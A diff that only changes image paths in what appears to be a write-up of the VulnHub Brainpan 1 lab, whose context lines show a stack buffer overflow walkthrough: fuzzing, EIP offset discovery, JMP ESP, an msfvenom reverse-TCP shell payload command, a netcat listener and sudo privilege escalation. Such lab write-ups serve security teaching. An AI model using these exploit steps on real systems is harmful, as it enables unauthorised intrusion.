@@ -6,7 +6,7 @@ description: https://www.vulnhub.com/entry/brainpan-1,51/
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (227).png" alt=""><figcaption><p><a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (241).png" alt=""><figcaption><p><a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p></figcaption></figure>
 
 </div>
 
@@ -92,13 +92,13 @@ In alternative you can install others sw such as: [Immunity Debugger ](https://w
 
 Deploy attacker machine (Kali) and Brainpain machine on VirtualBox, Vmware or on a compatible emulator:
 
-<figure><img src="../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
 
 and check relative IPs:
 
 🐲 Attacker/Kali IP: `192.168.56.7`  obtained using `ip a`&#x20;
 
-<figure><img src="../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
 
 The Brainpain VM is on the same subnet, than we do host discovery with nmap or arp-scan only in our subnet: `nmap 192.168.56.0/24`
 
@@ -205,17 +205,17 @@ SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
 
 We see that on port 1000 there's a web server, than we can try to open it on a browser.
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 and this is relative page source code:
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 We can see that it is a static page with only an image included.
 
 While on port 9999 there's an hypotetic login form, but without possibility to insert input.
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 Now, we try to find potential hidden directory using gobuster:
 
@@ -250,7 +250,7 @@ and we find an interesting path: [http://brainpain:10000/bin/](http://brainpain:
 
 Going to it we find an interesting file exe, that we can download in locally:
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 Check more info about executable using command file:
 
@@ -267,7 +267,7 @@ wine brainpan.exe
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -277,7 +277,7 @@ Program was waiting a connection on port 9999, then we can use netcat on localho
 nc 127.0.0.1 9999
 ```
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 now we can interact with login shell and insert psw (that we don't know).
 
@@ -293,7 +293,7 @@ We can try to test sw using a fuzzer script in python:
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500
 ```
 
-<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 add it into offset variable of our script:
 
@@ -309,15 +309,15 @@ sock.send(buffer)
 sock.close()
 ```
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 program was crashed and we need to copy value of EIP register
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -331,7 +331,7 @@ Now, we need to use pattern\_offset ruby script with EIP value to calculate corr
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -356,7 +356,7 @@ sock.close()
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -366,7 +366,7 @@ Next goal is to overwrite EIP putting JMP ESP value, then find JMP ESP address
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -408,7 +408,7 @@ All right, ow we need to replace the 400 C's of the ESP with our shellcode:
 msfvenom -p linux/x86/shell/reverse_tcp -b \x00 LHOST=192.168.56.7 LPORT=5555 -f python
 ```
 
-<figure><img src="../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>
 
 in the below script to prevent i've add before shellcode a sequence of NOP chars to prevent the inexact memory addresses matter. NOP sleds help align the actual shellcode to a specific memory address. In some cases, the payload needs to be aligned to a particular memory boundary for successful execution. NOP sleds provide a flexible way to achieve this alignment. Of course NOP operations will be not executed and program will pass directly to our shell code inserted into buf variable.
 
@@ -444,7 +444,7 @@ First to execute it, we need to listening it on the same port of shellcode IP an
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -456,7 +456,7 @@ python3 shellcode.py 192.168.56.8
 
 Connection was established on port 5555, and we've obtained a reverse shell
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
 ## Task 4 - Privilege Escalation
 
@@ -483,7 +483,7 @@ sudo -u root /home/anansi/bin/anansi_util
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -495,7 +495,7 @@ sudo -u root /home/anansi/bin/anansi_util manual ls
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -503,6 +503,6 @@ save it, and we'll obtain root permissions!
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 </div>
